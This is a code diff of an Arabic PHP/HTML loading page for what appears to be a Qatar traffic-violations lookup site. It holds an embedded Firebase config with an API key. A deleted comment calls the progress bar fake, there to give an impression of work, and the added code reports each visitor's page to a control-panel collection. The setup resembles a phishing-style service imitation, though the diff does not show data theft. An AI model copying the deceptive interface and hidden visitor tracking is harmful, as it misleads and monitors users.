@@ -1,5 +1,6 @@
 <?php
-// تأكد أن الملف بامتداد .php ليعمل مع Vercel Runtime
+// صفحة الانتظار - المهندس حسن
+// تم تنظيف الكود تماماً من أي اتصالات خارجية بـ MySQL
 ?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -29,7 +30,6 @@
         .text { color: #333; font-size: 20px; font-weight: 600; margin-bottom: 10px; }
         .sub-text { color: #6e6e6e; font-size: 15px; }
         
-        /* شريط تقدم وهمي لإعطاء انطباع بالعمل */
         .progress-bar {
             width: 200px;
             height: 6px;
@@ -62,7 +62,6 @@
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
 
     <script>
-        // إعدادات Firebase (نفس التي استخدمناها في index.php)
         const firebaseConfig = {
             apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
             authDomain: "jusour-qatar.firebaseapp.com",
@@ -75,32 +74,33 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-        // الحصول على معرف الطلب من التخزين المؤقت
         const orderId = sessionStorage.getItem("last_order_id");
 
         if (!orderId) {
-            // إذا لم يوجد طلب، ارجع للرئيسية
             window.location.href = "index.php";
         } else {
-            // مراقبة الطلب في Firebase لحظة بلحظة (Real-time)
+            // تحديث حالة الزائر في لوحة التحكم إنه وصل لصفحة التحميل
+            db.collection("active_visits").doc(orderId).update({
+                page: "loading",
+                last_seen: firebase.firestore.FieldValue.serverTimestamp()
+            }).catch(() => {});
+
+            // مراقبة الطلب (Real-time)
             const unsubscribe = db.collection("orders").doc(orderId)
                 .onSnapshot((doc) => {
                     if (doc.exists) {
                         const data = doc.data();
                         const status = data.status;
 
-                        // تحديث الرسائل للمستخدم بناءً على حالة البوت
                         if (status === "processing") {
                             document.getElementById("status-msg").innerText = "تم العثور على اللوحة، جاري حساب المخالفات...";
                         }
 
-                        // إذا تغيرت الحالة إلى "success" (يعني البوت خلص سحب)
                         if (status === "success") {
-                            unsubscribe(); // أوقف المراقبة
-                            window.location.href = "violations_view.php"; // انتقل لصفحة النتائج
+                            unsubscribe();
+                            window.location.href = "violations_view.php";
                         }
                         
-                        // في حالة وجود خطأ من الرادار
                         if (status === "error") {
                             alert("عذراً، لم يتم العثور على بيانات لهذه اللوحة. يرجى التأكد والمحاولة لاحقاً.");
                             window.location.href = "index.php";
